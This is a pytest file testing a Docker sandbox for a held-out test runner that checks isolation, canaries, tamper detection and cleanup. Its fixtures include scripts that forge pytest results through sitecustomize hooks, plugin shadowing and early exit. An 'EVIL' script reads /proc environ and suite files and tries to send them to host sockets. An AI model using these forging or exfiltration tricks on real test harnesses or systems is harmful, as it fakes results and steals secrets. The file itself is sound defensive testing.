"""Spec 008: ``heldout-run run --sandbox docker`` (held-out runner sandbox).

Toy trees and toy suites in temp dirs; HOME, HELDOUT_ROOT and TMPDIR point at temp directories.
Tests that need a Docker daemon are marked ``docker`` (skipped when no daemon answers); the first
one builds the ``heldout-sandbox:<tag>`` image (kept cached). Every container and volume a run
creates carries the label ``heldout-run.id=<id>`` and must be gone when the run ends.
"""

from __future__ import annotations

import hashlib
import importlib.util
import json
import os
import re
import shutil
import site
import socket
import subprocess
import sys
import textwrap
import threading
import time
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
RUNNER = REPO_ROOT / "scripts" / "heldout_run.py"
FEATURE = "001-demo"

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="needs git")


def _load():
    spec = importlib.util.spec_from_file_location("heldout_run_sandbox_under_test", RUNNER)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


hr = _load()


def _git(cwd: Path, *args: str) -> None:
    env = dict(os.environ, GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_SYSTEM="/dev/null")
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c",
                    "init.defaultBranch=main", *args], cwd=cwd, check=True, capture_output=True,
                   env=env)


class Env:
    def __init__(self, tmp: Path):
        self.tmp = tmp
        self.home = tmp / "home"
        self.root = tmp / "hroot"
        self.tmpdir = tmp / "scratch"
        for d in (self.home, self.tmpdir):
            d.mkdir()
        self.root.mkdir(mode=0o700)
        self.root.chmod(0o700)
        self.repo = tmp / "repo"
        self.repo.mkdir()
        (self.repo / "demo.py").write_text("def value():\n    return 1\n")
        _git(self.repo, "init", "-q")
        _git(self.repo, "add", "-A")
        _git(self.repo, "commit", "-q", "-m", "init")

    def tree(self, files: dict[str, str]) -> None:
        for name, body in files.items():
            p = self.repo / name
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(textwrap.dedent(body))

    def suite(self, files: dict[str, str]) -> Path:
        d = self.root / "demo" / FEATURE
        d.mkdir(parents=True, exist_ok=True)
        for p in (d, d.parent):
            p.chmod(0o700)
        for name, body in files.items():
            (d / name).write_text(textwrap.dedent(body))
        return d

    def env(self, **extra: str) -> dict[str, str]:
        e = dict(os.environ)
        e.update(HOME=str(self.home), HELDOUT_ROOT=str(self.root), TMPDIR=str(self.tmpdir))
        e.pop("PYTEST_ADDOPTS", None)
        if site.USER_BASE:
            e.setdefault("PYTHONUSERBASE", site.USER_BASE)
        e.update(extra)
        return e

    def run(self, *args: str, env: dict | None = None, timeout: float = 900):
        return subprocess.run([sys.executable, str(RUNNER), *args], capture_output=True,
                              text=True, env=env or self.env(), timeout=timeout)

    def run_wt(self, *extra: str, sandbox: bool = True, **kw):
        args = ["run", "--profile", "generic", "--repo-name", "demo", "--feature", FEATURE,
                "--worktree", str(self.repo)]
        if sandbox:
            args += ["--sandbox", "docker"]
        return self.run(*args, *extra, **kw)

    @property
    def report_root(self) -> Path:
        return self.root / "_reports" / "demo" / FEATURE

    def report(self, name: str = "round-01") -> dict:
        return json.loads((self.report_root / name / "report.json").read_text())

    def last_report(self) -> dict:
        dirs = [p for p in self.report_root.iterdir() if (p / "report.json").exists()]
        latest = max(dirs, key=lambda p: (p / "report.json").stat().st_mtime)
        return json.loads((latest / "report.json").read_text())


@pytest.fixture
def h(tmp_path: Path) -> Env:
    return Env(tmp_path)


def _docker_leftovers(run_id: str) -> list[str]:
    out = []
    for cmd in (["docker", "ps", "-aq", "--filter", f"label=heldout-run.id={run_id}"],
                ["docker", "volume", "ls", "-q", "--filter", f"label=heldout-run.id={run_id}"]):
        out += subprocess.run(cmd, capture_output=True, text=True).stdout.split()
    return out


def _assert_run_clean(h: Env, rep: dict) -> None:
    run_id = rep["meta"].get("sandbox_run_id")
    assert run_id, "report has no sandbox run id"
    assert _docker_leftovers(run_id) == []
    assert list(h.tmpdir.iterdir()) == []


DEMO_SUITE = {
    "test_demo.py": """
        import pytest
        import demo

        @pytest.mark.fr("FR-001")
        def test_one():
            assert demo.value() == 1

        @pytest.mark.fr("FR-001")
        def test_two():
            assert demo.value() == 1

        @pytest.mark.fr("FR-002")
        @pytest.mark.parametrize("x", [1, 2, 3, 4])
        def test_three(x):
            assert x <= 2
    """,
}
DEMO_LINES = ["heldout-run: 001-demo round 1/4: failed", "FR-002: 2/4 failing",
              "total: 2/6 tests failing, 0 skipped; 1/2 ids failing"]

PASS_SUITE = {
    "test_ok.py": """
        import pytest

        @pytest.mark.fr("FR-001")
        def test_a():
            assert True

        @pytest.mark.fr("FR-002")
        def test_b():
            assert True
    """,
}

HANG_SUITE = {"test_hang.py": """
    import signal, time, pytest

    @pytest.mark.fr("FR-001")
    def test_quick():
        assert True

    @pytest.mark.fr("FR-013")
    def test_hang():
        signal.signal(signal.SIGTERM, signal.SIG_IGN)
        while True:
            time.sleep(1)

    @pytest.mark.fr("FR-013")
    def test_never_reached():
        assert True
"""}


# -- no Docker needed -------------------------------------------------------------------------


def test_api_constants_and_codes():
    assert hr.SANDBOX_JUDGE_UID == 10101 and hr.SANDBOX_IMPL_UID == 10102
    assert {"E_SANDBOX_UNAVAILABLE", "E_SANDBOX_DOCKER"} <= hr.ERROR_CODES
    assert "tampered" in hr.STATUSES
    text = hr.SANDBOX_DOCKERFILE
    for needle in ("python:3.12", "uv", "pytest", "git", "10101", "10102", "judge", "impl",
                   "/usr/local/bin/heldout-impl"):
        assert needle in text, needle
    tag = hashlib.sha256(text.encode("utf-8")).hexdigest()[:12]
    assert hr.sandbox_image() == f"heldout-sandbox:{tag}"


def test_tampered_feedback_has_only_feature_round_cap_status():
    recs = [{"nodeid": "t::a", "key": "a", "ids": ["FR-001"], "outcome": "failed"}]
    fb = hr.summarize(recs, feature=FEATURE, round=2, cap=4, status="tampered")
    assert fb == {"schema": "heldout-feedback.v1", "feature": FEATURE, "round": 2,
                  "round_cap": 4, "status": "tampered"}
    assert hr.format_feedback(fb).splitlines() == [
        "heldout-run: 001-demo round 2/4: tampered", "status: tampered"]
    fb = hr.summarize(recs, feature=FEATURE, round=4, cap=4, status="tampered")
    assert hr.format_feedback(fb).splitlines()[-1] == "round cap reached: escalate to owner"


def test_help_states_sandbox_limits(h):
    p = h.run("run", "--help")
    flat = " ".join(p.stdout.split())
    for needle in ("--sandbox", "Docker itself is the boundary", "low-bandwidth", "canar",
                   "not a sandbox"):
        assert needle in flat, needle
    doc = " ".join((hr.__doc__ or "").split())
    assert "Docker itself is the boundary" in doc and "canar" in doc


def test_bad_sandbox_value_is_usage_error(h):
    h.suite(PASS_SUITE)
    p = h.run_wt("--sandbox", "podman", sandbox=False)
    assert (p.returncode, p.stdout, p.stderr) == (2, "", "heldout-run: error E_USAGE\n")


@pytest.mark.parametrize("args", [["-m", "docker"], ["-mdocker"], ["-m", "slow or docker"],
                                  ["-m", "(docker)"], ["-m", "not slow and docker"]])
def test_docker_marker_selection_is_refused(h, args):
    h.suite(PASS_SUITE)
    extra = [f"--pytest-arg={a}" for a in args]
    p = h.run_wt(*extra)
    assert (p.returncode, p.stdout, p.stderr) == (2, "", "heldout-run: error E_SANDBOX_DOCKER\n")
    assert list(h.tmpdir.iterdir()) == []
    assert not h.report_root.exists() or not any(h.report_root.glob("round-*"))


@pytest.mark.parametrize("args", [["-m", "not docker"], ["-m", "slow and not docker"],
                                  ["-k", "docker"]])
def test_docker_marker_matcher_allows(args):
    assert hr._selects_docker_marker(args) is False


def test_docker_marker_unsandboxed_is_fine(h):
    h.suite(PASS_SUITE)
    p = h.run_wt("--pytest-arg=-m", "--pytest-arg=docker", sandbox=False)
    # no refusal: 007 rules apply (everything deselected -> pytest exit 5 -> collection_error)
    assert (p.returncode, p.stderr) == (3, "")


def _no_docker_path(tmp: Path) -> str:
    d = tmp / "bin-nodocker"
    d.mkdir()
    for tool in ("git",):
        os.symlink(shutil.which(tool), d / tool)
    return str(d)


def test_docker_missing_is_sandbox_unavailable(h, tmp_path):
    h.suite(PASS_SUITE)
    p = h.run_wt(env=h.env(PATH=_no_docker_path(tmp_path)))
    assert p.returncode == 3
    assert p.stderr == "heldout-run: error E_SANDBOX_UNAVAILABLE\n"
    assert p.stdout.splitlines()[0] == "heldout-run: 001-demo round -/4: infra_error"
    assert not (h.report_root / "rounds.json").exists()
    assert list(h.tmpdir.iterdir()) == []


def test_daemon_unreachable_is_sandbox_unavailable(h, tmp_path):
    h.suite(PASS_SUITE)
    p = h.run_wt(env=h.env(DOCKER_HOST=f"unix://{tmp_path}/no-such.sock"))
    assert p.returncode == 3
    assert p.stderr == "heldout-run: error E_SANDBOX_UNAVAILABLE\n"
    assert not (h.report_root / "rounds.json").exists()


def test_unsandboxed_run_has_no_heldout_impl_and_reports_sandbox_none(h):
    h.suite({"test_env.py": """
        import os, pytest

        @pytest.mark.fr("FR-012")
        def test_env():
            assert "HELDOUT_IMPL" not in os.environ
    """})
    p = h.run_wt(sandbox=False, env=h.env(HELDOUT_IMPL="/bin/false"))
    assert p.returncode == 0, p.stdout
    meta = h.report()["meta"]
    assert meta["sandbox"] == "none" and meta["image"] is None
    assert h.report()["canaries"] == []


# -- Docker -----------------------------------------------------------------------------------

docker = pytest.mark.docker


@docker
@pytest.mark.parametrize("kind", ["fail", "pass", "collect", "timeout"])
def test_sandboxed_feedback_equals_unsandboxed(h, kind):
    suites = {"fail": DEMO_SUITE, "pass": PASS_SUITE, "timeout": HANG_SUITE,
              "collect": {"test_bad.py": "import no_such_module_qq\n\ndef test_x():\n    pass\n"}}
    h.suite(suites[kind])
    extra = ["--no-count"] + (["--timeout", "6"] if kind == "timeout" else [])
    plain = h.run_wt(*extra, sandbox=False)
    t0 = time.monotonic()
    boxed = h.run_wt(*extra)
    took = time.monotonic() - t0
    assert boxed.stderr == plain.stderr == ""
    assert (boxed.returncode, boxed.stdout) == (plain.returncode, plain.stdout)
    if kind == "timeout":
        assert took < 6 + 15 + 30
    rep = h.last_report()
    assert rep["meta"]["sandbox"] == "docker"
    _assert_run_clean(h, rep)


@docker
def test_report_meta_canaries_and_isolation(h):
    h.suite(DEMO_SUITE)
    p = h.run_wt()
    assert p.stdout.splitlines() == DEMO_LINES and p.returncode == 1
    rep = h.report()
    meta = rep["meta"]
    assert meta["sandbox"] == "docker" and meta["image"] == hr.sandbox_image()
    assert meta["isolation"] == "partial"  # the suite imports demo from /work
    names = {c["expect"]: c for c in rep["canaries"]}
    assert set(names) == {"failed", "passed"}
    assert names["failed"]["outcome"] == "failed" and names["passed"]["outcome"] == "passed"
    for c in rep["canaries"]:
        hexpart = c["name"].removeprefix("test_")
        assert len(hexpart) >= 16 and re.fullmatch(r"[0-9a-f]+", hexpart)
        assert c["name"] not in p.stdout and c["file"] not in p.stdout
        assert not any(c["name"] in t["nodeid"] for t in rep["tests"])
    assert len(rep["tests"]) == 6
    d = h.report_root / "round-01"
    for f in d.iterdir():
        assert f.stat().st_mode & 0o777 == 0o600, f.name
    assert {"junit.xml", "pytest.log", "report.json", "feedback.json"} <= {f.name for f in d.iterdir()}
    # a second run gets different canaries
    h.suite(PASS_SUITE)
    (h.root / "demo" / FEATURE / "test_demo.py").unlink()
    assert h.run_wt().returncode == 0
    rep2 = h.report("round-02")
    assert rep2["meta"]["isolation"] == "full"
    assert not {c["name"] for c in rep2["canaries"]} & {c["name"] for c in rep["canaries"]}
    _assert_run_clean(h, rep2)


IMPL_SUITE = {"test_impl.py": """
    import json, os, socket, subprocess, sys, pytest

    IMPL = os.environ.get("HELDOUT_IMPL")

    def caps(pid="self"):
        with open(f"/proc/{pid}/status") as fh:
            return {l.split(":")[0]: l.split()[1] for l in fh if l.startswith("Cap")}

    @pytest.mark.fr("FR-012")
    def test_judge_and_impl_uids():
        assert IMPL == "/usr/local/bin/heldout-impl"
        assert os.getuid() == 10101 and os.getgid() == 10101
        out = subprocess.run([IMPL, "id", "-u"], capture_output=True, text=True)
        assert out.returncode == 0 and out.stdout.strip() == "10102"
        out = subprocess.run([IMPL, "id", "-G"], capture_output=True, text=True)
        assert out.stdout.split() == ["10102"]

    @pytest.mark.fr("FR-012")
    def test_no_capabilities_anywhere():
        for k, v in caps().items():
            assert int(v, 16) == 0, k
        code = "print(open('/proc/self/status').read())"
        out = subprocess.run([IMPL, sys.executable, "-c", code], capture_output=True, text=True)
        for line in out.stdout.splitlines():
            if line.startswith("Cap"):
                assert int(line.split()[1], 16) == 0, line

    @pytest.mark.fr("FR-011")
    def test_impl_cannot_read_judge_files():
        for path in (__file__, "/suite", "/out", os.environ["HELDOUT_RUN_RECORDS"],
                     "/out/plugin/heldout_run.py", "/out/junit.xml"):
            out = subprocess.run([IMPL, "cat", path], capture_output=True)
            assert out.returncode != 0, path
            out = subprocess.run([IMPL, "ls", path], capture_output=True)
            assert out.returncode != 0, path
        out = subprocess.run([IMPL, "sh", "-c", "echo x > /out/forged"], capture_output=True)
        assert out.returncode != 0
        out = subprocess.run([IMPL, "sh", "-c", "cat /proc/1/environ /proc/%d/environ" % os.getpid()],
                             capture_output=True)
        assert out.returncode != 0

    @pytest.mark.fr("FR-012")
    def test_io_env_cwd_and_status(tmp_path):
        out = subprocess.run([IMPL, "sh", "-c", "read x; echo got:$x; echo err >&2; exit 7"],
                             input="hello\\n", capture_output=True, text=True)
        assert (out.returncode, out.stdout, out.stderr) == (7, "got:hello\\n", "err\\n")
        env = dict(os.environ, QQ_VAR="v1")
        out = subprocess.run([IMPL, "sh", "-c", "echo $QQ_VAR:${HELDOUT_RUN_RECORDS:-none}:$(pwd)"],
                             capture_output=True, text=True, env=env, cwd="/work")
        assert out.stdout == "v1:none:/work\\n"
        out = subprocess.run([IMPL, "sh", "-c", "kill -TERM $$"], capture_output=True)
        assert out.returncode == -15
        out = subprocess.run([IMPL, "no-such-cmd-qq"], capture_output=True)
        assert out.returncode == 127

    @pytest.mark.fr("FR-006")
    def test_no_network_and_readonly_root():
        with pytest.raises(OSError):
            socket.create_connection(("1.1.1.1", 53), timeout=3)
        with pytest.raises(OSError):
            open("/usr/qq-written", "w")
        st = os.stat("/work")
        assert (st.st_uid, st.st_gid) == (10102, 10101)  # owner impl; group judge may write
        open("/work/judge-wrote.txt", "w").write("x")  # a suite may write into the repo
        with open("/tmp/x.sh", "w") as fh:
            fh.write(chr(10).join(["#!/bin/sh", "echo ok", ""]))
        os.chmod("/tmp/x.sh", 0o755)
        assert subprocess.run(["/tmp/x.sh"], capture_output=True, text=True).stdout.strip() == "ok"
        for d in ("/suite", "/out"):
            st = os.stat(d)
            assert (st.st_uid, st.st_mode & 0o777) == (10101, 0o700), d
        assert os.environ["HELDOUT_RUN_RECORDS"].startswith("/out/")
        assert "/work" in os.environ["PYTHONPATH"].split(":")

    @pytest.mark.fr("FR-012")
    def test_killed_client_kills_impl_child():
        p = subprocess.Popen([IMPL, "sleep", "300"])
        import time
        time.sleep(1)
        p.kill()
        p.wait()
        time.sleep(1)
        out = subprocess.run(["sh", "-c", "cat /proc/[0-9]*/cmdline | tr '\\\\0' ' '"],
                             capture_output=True, text=True)
        assert "sleep 300" not in out.stdout
"""}


@docker
def test_heldout_impl_separation(h):
    h.suite(IMPL_SUITE)
    p = h.run_wt()
    assert p.returncode == 0, (p.stdout, (h.report_root / "round-01" / "pytest.log").read_text())
    assert p.stdout.splitlines() == ["heldout-run: 001-demo round 1/4: passed",
                                     "total: 0/6 tests failing, 0 skipped; 0/3 ids failing"]
    assert h.report()["meta"]["isolation"] == "full"
    _assert_run_clean(h, h.report())


# -- forging trees (SC-004) -------------------------------------------------------------------

FORGE_SUITE = {
    "test_forge.py": """
        import pytest
        import demo

        @pytest.mark.fr("FR-001")
        def test_ok():
            assert demo.value() == 1

        @pytest.mark.fr("FR-002")
        def test_bad():
            assert demo.value() == 2

        @pytest.mark.fr("FR-002")
        def test_bad_too():
            assert demo.value() == 3
    """,
}

_REWRITE_RECORDS = """
    import atexit, json, os

    def _rewrite():
        path = os.environ.get("HELDOUT_RUN_RECORDS")
        if not path or not os.path.exists(path):
            return
        out = []
        for line in open(path):
            rec = json.loads(line)
            if rec.get("type") == "report":
                rec["outcome"] = "passed"
                rec["longrepr"] = ""
            if rec.get("type") == "finish":
                rec["exitstatus"] = 0
            out.append(json.dumps(rec))
        open(path, "w").write("\\n".join(out) + "\\n")
    atexit.register(_rewrite)
"""

_PASS_HOOK = """
    import _pytest.reports as R
    _orig = R.TestReport.__init__

    def _init(self, *a, **kw):
        _orig(self, *a, **kw)
        if self.outcome == "failed":
            self.outcome = "passed"
            self.longrepr = None
    R.TestReport.__init__ = _init
"""

_REWRITE_BOTH = _REWRITE_RECORDS + """
    import re
    def _junit():
        p = "/out/junit.xml"
        if os.path.exists(p):
            t = open(p).read()
            t = re.sub(r"<failure[^>]*>.*?</failure>", "", t, flags=re.S)
            t = re.sub(r"<failure[^>]*/>", "", t)
            t = re.sub(r'failures="\\d+"', 'failures="0"', t)
            open(p, "w").write(t)
    atexit.register(_junit)
"""

FORGERS = {
    # rewrite the records file at interpreter exit (junit still tells the truth)
    "rewrite_records": {"sitecustomize.py": _REWRITE_RECORDS},
    # shadow the plugin module with one that reports every phase as passed
    "shadow_plugin": {"heldout_run.py": """
        import importlib.util, os
        _spec = importlib.util.spec_from_file_location("_real", "/out/plugin/heldout_run.py")
        _real = importlib.util.module_from_spec(_spec)
        _spec.loader.exec_module(_real)
        pytest_configure = _real.pytest_configure
        pytest_collection_finish = _real.pytest_collection_finish
        pytest_collectreport = _real.pytest_collectreport
        pytest_sessionfinish = _real.pytest_sessionfinish

        class _R:
            def __init__(self, r):
                self.__dict__.update(r.__dict__)
                self.outcome = "passed"
                self.longrepr = None

        def pytest_runtest_logreport(report):
            _real.pytest_runtest_logreport(_R(report))
    """},
    # mark everything passed in-process (records and junit agree; the failing canary passes)
    "pass_hook": {"sitecustomize.py": _PASS_HOOK},
    # exit early with status 0 from test-time code
    "exit_zero": {"demo.py": """
        import os

        def value():
            os._exit(0)
    """},
    # mark everything passed and delete the junit file
    "delete_junit": {"sitecustomize.py": _PASS_HOOK + """
    import atexit, os
    atexit.register(lambda: os.path.exists("/out/junit.xml") and os.unlink("/out/junit.xml"))
    """},
    # rewrite records and junit consistently
    "rewrite_both": {"sitecustomize.py": _REWRITE_BOTH},
}


@docker
@pytest.mark.parametrize("strategy", sorted(FORGERS))
def test_forging_tree_is_caught(h, strategy):
    h.tree(FORGERS[strategy])
    h.suite(FORGE_SUITE)
    p = h.run_wt()
    lines = p.stdout.splitlines()
    assert "passed" not in lines[0]
    assert lines[0] in ("heldout-run: 001-demo round 1/4: tampered",
                        "heldout-run: 001-demo round 1/4: collection_error"), (strategy, lines)
    if lines[0].endswith("tampered"):
        assert lines == ["heldout-run: 001-demo round 1/4: tampered", "status: tampered"]
        assert p.returncode == 1 and p.stderr == ""
        rounds = json.loads((h.report_root / "rounds.json").read_text())
        assert rounds["rounds"][0]["status"] == "tampered"
        assert rounds["rounds"][0]["failing_ids"] == []
        q = h.run_wt("--no-count", "--json")
        fb = json.loads(q.stdout)
        assert fb == {"schema": "heldout-feedback.v1", "feature": FEATURE, "round": None,
                      "round_cap": 4, "status": "tampered"}
    rep = h.report()
    assert rep["meta"]["status"] in ("tampered", "collection_error")
    _assert_run_clean(h, rep)


@docker
def test_honest_tree_with_same_suite_is_failed_not_tampered(h):
    h.suite(FORGE_SUITE)
    p = h.run_wt()
    assert p.stdout.splitlines() == ["heldout-run: 001-demo round 1/4: failed",
                                     "FR-002: 2/2 failing",
                                     "total: 2/3 tests failing, 0 skipped; 1/2 ids failing"]


# -- exfiltration (Story 2, SC-003) ------------------------------------------------------------

TOKEN = "qqsuitetok9"


class _Listener:
    """A TCP listener on all host interfaces that counts accepted connections."""

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", 0))
        self.sock.listen(16)
        self.sock.settimeout(0.5)
        self.port = self.sock.getsockname()[1]
        self.hits: list[bytes] = []
        self.stop = False
        self.t = threading.Thread(target=self._loop, daemon=True)
        self.t.start()

    def _loop(self):
        while not self.stop:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                continue
            conn.settimeout(1)
            try:
                self.hits.append(conn.recv(100))
            except OSError:
                self.hits.append(b"")
            conn.close()

    def close(self):
        self.stop = True
        self.t.join(5)
        self.sock.close()


EVIL = """
    import glob, os, socket, sys

    PHASE = sys.argv[1]
    PORT = int(sys.argv[2])
    loot = []
    for pattern in ("/suite", "/suite/*", "/out/*", "/proc/*/environ", "/proc/*/cwd/*"):
        for p in glob.glob(pattern):
            try:
                with open(p, "rb") as fh:
                    loot.append(fh.read(4096))
            except OSError:
                pass
    blob = b"".join(loot)
    for d in ("/work", "/tmp", "/home/impl", "/var/tmp", "/dev/shm"):
        try:
            with open(os.path.join(d, "loot-" + PHASE), "wb") as fh:
                fh.write(blob or b"nothing")
        except OSError:
            pass
    connected = []
    for host in ("127.0.0.1", "172.17.0.1", "host.docker.internal", "1.1.1.1"):
        try:
            s = socket.create_connection((host, PORT), timeout=2)
            s.sendall(PHASE.encode())
            s.close()
            connected.append(host)
        except OSError:
            pass
    token = ("qqsuite" + "tok9").encode()
    print("EVIL", PHASE, "suite-text", token in blob, "connected", connected)
    sys.exit(0)
"""


@docker
def test_hostile_tree_cannot_exfiltrate(h):
    listener = _Listener()
    try:
        h.tree({"evil.py": EVIL,
                # judge-side code: copies the suite wherever it can write
                "sitecustomize.py": """
                    import glob, os
                    blob = b""
                    for p in glob.glob("/suite/*.py"):
                        blob += open(p, "rb").read()
                    for d in ("/work", "/tmp", "/var/tmp", "/dev/shm", "/home/judge"):
                        try:
                            open(os.path.join(d, "judge-loot"), "wb").write(blob)
                        except OSError:
                            pass
                """})
        h.suite({"test_ex.py": f"""
            import os, subprocess, sys, pytest
            # {TOKEN} lives in the suite text

            @pytest.mark.fr("FR-011")
            def test_exfil():
                out = subprocess.run([os.environ["HELDOUT_IMPL"], sys.executable, "/work/evil.py",
                                      "test", "{listener.port}"], capture_output=True, text=True)
                assert "suite-text False connected []" in out.stdout, out.stdout + out.stderr
        """})
        sync = f"python3 /work/evil.py sync {listener.port}"
        p = h.run_wt("--sync-cmd", sync, "--keep")
        assert p.returncode == 0, p.stdout
    finally:
        listener.close()
    rep = h.report()
    sync_log = (h.report_root / "round-01" / "sync.log").read_text()
    assert "EVIL sync suite-text False" in sync_log
    assert b"test" not in listener.hits  # nothing from the test phase reached the host
    kept = Path(rep["meta"]["kept_copy"])
    try:
        for base in (h.repo, h.tmpdir, h.home, kept):
            for f in base.rglob("*"):
                if f.is_file() and not f.is_symlink():
                    assert TOKEN.encode() not in f.read_bytes(), f
        assert not (kept / "tests" / "heldout").exists()
    finally:
        shutil.rmtree(kept, ignore_errors=True)
    _assert_run_clean(h, rep)


@docker
def test_sync_cmd_runs_as_impl_without_suite(h):
    h.suite({"test_sync.py": """
        import pytest

        @pytest.mark.fr("FR-004")
        def test_marker():
            info = open("/work/sync-info.txt").read().split()
            assert info[0] == "10102" and info[1] == "nosuite", info
    """})
    p = h.run_wt("--sync-cmd",
                 "sh -c 'echo $(id -u) $(ls /suite >/dev/null 2>&1 && echo suite || echo nosuite)"
                 " > {copy}/sync-info.txt'")
    assert p.returncode == 0, p.stdout
    assert (h.report_root / "round-01" / "sync.log").exists()
    assert not (h.repo / "sync-info.txt").exists()


@docker
def test_failing_sync_cmd_is_infra_error(h):
    h.suite(PASS_SUITE)
    p = h.run_wt("--sync-cmd", "sh -c 'exit 3'")
    assert (p.returncode, p.stderr) == (3, "heldout-run: error E_SYNC\n")
    assert not (h.report_root / "rounds.json").exists()
    _assert_run_clean(h, h.last_report())


@docker
def test_generic_without_sync_cmd_has_no_sync_step(h):
    h.suite(PASS_SUITE)
    p = h.run_wt()
    assert p.returncode == 0
    assert not (h.report_root / "round-01" / "sync.log").exists()


@docker
def test_repo_ref_mode_sandboxed(h):
    h.suite(DEMO_SUITE)
    p = h.run("run", "--profile", "generic", "--repo-name", "demo", "--feature", FEATURE,
              "--repo", str(h.repo), "--ref", "HEAD", "--sandbox", "docker")
    assert p.stdout.splitlines() == DEMO_LINES


@docker
def test_small_suite_overhead_is_bounded(h):
    h.suite(DEMO_SUITE)
    t0 = time.monotonic()
    h.run_wt("--no-count", sandbox=False)
    plain = time.monotonic() - t0
    t0 = time.monotonic()
    h.run_wt("--no-count")
    assert time.monotonic() - t0 < plain + 60


# -- honest suites with unusual outcomes are never "tampered" ---------------------------------

TRICKY_SUITE = {
    "test_tricky.py": """
        import pytest

        @pytest.fixture
        def bad_teardown():
            yield
            raise RuntimeError("teardown boom")

        @pytest.mark.fr("FR-001")
        def test_pass():
            pass

        @pytest.mark.fr("FR-001")
        def test_fail_then_teardown_error(bad_teardown):
            assert False

        @pytest.mark.fr("FR-002")
        def test_pass_then_teardown_error(bad_teardown):
            pass

        @pytest.mark.fr("FR-002")
        @pytest.mark.skip(reason="skipped")
        def test_skip():
            pass

        @pytest.mark.fr("FR-003")
        @pytest.mark.xfail(reason="known")
        def test_xfail():
            assert False

        @pytest.mark.fr("FR-003")
        @pytest.mark.xfail(strict=True, reason="x")
        def test_xpass_strict():
            pass

        @pytest.mark.fr("FR-003")
        @pytest.mark.xfail(reason="x")
        def test_xpass():
            pass

        @pytest.fixture
        def bad_setup():
            raise RuntimeError("setup boom")

        @pytest.mark.fr("FR-004")
        def test_setup_error(bad_setup):
            pass

        @pytest.mark.fr("FR-004")
        @pytest.mark.parametrize("v", ["a::b", "x/y", "[z]"])
        def test_odd_params(v):
            assert v
    """,
    "test_modskip.py": """
        import pytest
        pytest.skip("whole module", allow_module_level=True)

        def test_never():
            pass
    """,
    "sub/test_nested.py": """
        import pytest

        class TestK:
            @pytest.mark.fr("FR-005")
            def test_m(self):
                assert 1 == 2
    """,
}


@docker
@pytest.mark.parametrize("extra", [[], ["--pytest-arg=-x"], ["--pytest-arg=-k", "--pytest-arg=pass"],
                                   ["--pytest-arg=-m", "--pytest-arg=not docker"]])
def test_tricky_honest_suite_matches_unsandboxed(h, extra):
    for name, body in TRICKY_SUITE.items():
        (h.root / "demo" / FEATURE / name).parent.mkdir(parents=True, exist_ok=True)
    h.suite(TRICKY_SUITE)
    plain = h.run_wt("--no-count", *extra, sandbox=False)
    boxed = h.run_wt("--no-count", *extra)
    assert "tampered" not in boxed.stdout, h.last_report()["meta"].get("tamper_reasons")
    assert (boxed.returncode, boxed.stdout, boxed.stderr) == (
        plain.returncode, plain.stdout, plain.stderr)


@docker
def test_custom_python_files_still_runs_canaries(h):
    h.suite({"pytest.ini": "[pytest]\npython_files = check_*.py\n",
             "check_a.py": "import pytest\n\n@pytest.mark.fr('FR-001')\ndef test_a():\n    pass\n"})
    p = h.run_wt()
    assert p.returncode == 0, (p.stdout, h.report()["meta"].get("tamper_reasons"))
    assert {c["outcome"] for c in h.report()["canaries"]} == {"failed", "passed"}


@docker
def test_sigint_during_sandboxed_run_cleans_up(h):
    h.suite(HANG_SUITE)
    proc = subprocess.Popen([sys.executable, str(RUNNER), "run", "--profile", "generic",
                             "--repo-name", "demo", "--feature", FEATURE, "--worktree",
                             str(h.repo), "--sandbox", "docker"], env=h.env(),
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    deadline = time.monotonic() + 120
    try:
        _wait_and_interrupt(h, proc, deadline)
    finally:
        if proc.poll() is None:
            proc.kill()
            proc.wait()


def _wait_and_interrupt(h, proc, deadline):
    import signal as _signal

    run_id = None
    while time.monotonic() < deadline and run_id is None:
        out = subprocess.run(["docker", "ps", "--format", "{{.Names}}"], capture_output=True,
                             text=True).stdout
        for name in out.split():
            if name.startswith("heldout-") and name.endswith("-test"):
                logs = list(h.report_root.glob("*/sandbox.log"))
                if logs and name in logs[0].read_text():
                    run_id = name[len("heldout-"):-len("-test")]
        time.sleep(0.5)
    assert run_id
    time.sleep(3)
    proc.send_signal(_signal.SIGINT)
    out, err = proc.communicate(timeout=120)
    assert proc.returncode == 3 and err == "heldout-run: error E_SYNC\n"
    assert _docker_leftovers(run_id) == []
    assert list(h.tmpdir.iterdir()) == []


@docker
def test_whole_out_dir_is_copied_to_the_report(h):
    h.suite({"test_out.py": """
        import os, pytest

        @pytest.mark.fr("FR-009")
        def test_writes_out():
            open("/out/evidence.txt", "w").write("qqevidence")
            os.makedirs("/out/sub/deeper", exist_ok=True)
            open("/out/sub/deeper/more.txt", "w").write("qqmore")
            os.symlink("/etc/passwd", "/out/link")
            open("/out/report.json", "w").write("forged")
    """})
    p = h.run_wt()
    assert p.returncode == 0, p.stdout
    d = h.report_root / "round-01"
    assert (d / "evidence.txt").read_text() == "qqevidence"
    assert (d / "sub" / "deeper" / "more.txt").read_text() == "qqmore"
    assert not (d / "link").exists() and not (d / "link").is_symlink()
    assert not (d / "plugin").exists()
    assert json.loads((d / "report.json").read_text())["meta"]["status"] == "passed"
    for f in d.rglob("*"):
        assert f.stat().st_mode & 0o777 == (0o700 if f.is_dir() else 0o600), f
    for f in h.tmpdir.rglob("*"):
        raise AssertionError(f"scratch not empty: {f}")
    _assert_run_clean(h, h.report())
